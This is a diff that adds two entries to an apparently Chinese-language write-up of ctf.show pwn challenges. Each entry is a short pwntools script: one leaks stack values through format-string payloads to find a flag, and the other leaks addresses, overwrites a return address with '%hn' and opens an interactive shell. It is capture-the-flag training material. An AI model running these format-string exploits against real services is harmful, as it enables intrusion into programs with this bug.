@@ -967,3 +967,54 @@ for i in range(q,q+12):
 print(flag)
 ```
 
+## 99 flag在栈上的盲打
+
+```python
+from pwn import *
+context.log_level='error'
+def leak(payload):
+    p = remote('pwn.challenge.ctf.show',28182)
+    p.recv()
+    p.sendline(payload)
+    data = p.recvuntil('\n',drop=True)
+    if data.startswith(b'0x'):
+        print(p64(int(data,16)))
+    p.close()
+
+i = 1
+while 1:
+    payload = '%{}$p'.format(i)
+    leak(payload)
+    i+=1
+```
+
+## 100 一次性改写多个值
+
+```python
+from pwn import *
+context(arch = 'amd64',os = 'linux',log_level = 'debug')
+#io = process('./pwn')
+io = remote('pwn.challenge.ctf.show',28212)
+
+def fmt(payload):
+    io.recvuntil(">>")
+    io.sendline('2')
+    io.sendline(payload)
+io.sendline('00 00 00')
+fmt('%7$n-%16$p')
+io.recvuntil('-')
+ret_addr = int(io.recvuntil('\n')[:-1],16)-0x28
+payload = '%7$n+%17$p'
+fmt(payload)
+io.recvuntil('+')
+ret_value = int(io.recvuntil('\n')[:-1],16)
+elf_base = ret_value - 0x102c
+payload1 = b'%'+str((elf_base+0xf56)&0xffff).encode()+b'c%10$hn'
+payload1 = payload1.ljust(0x10,b'a')
+payload1 += p64(ret_addr)
+fmt(payload1)
+log.success("ret_value: "+hex(ret_value))
+log.success("ret_addr: "+hex(ret_addr))
+io.interactive()
+```
+
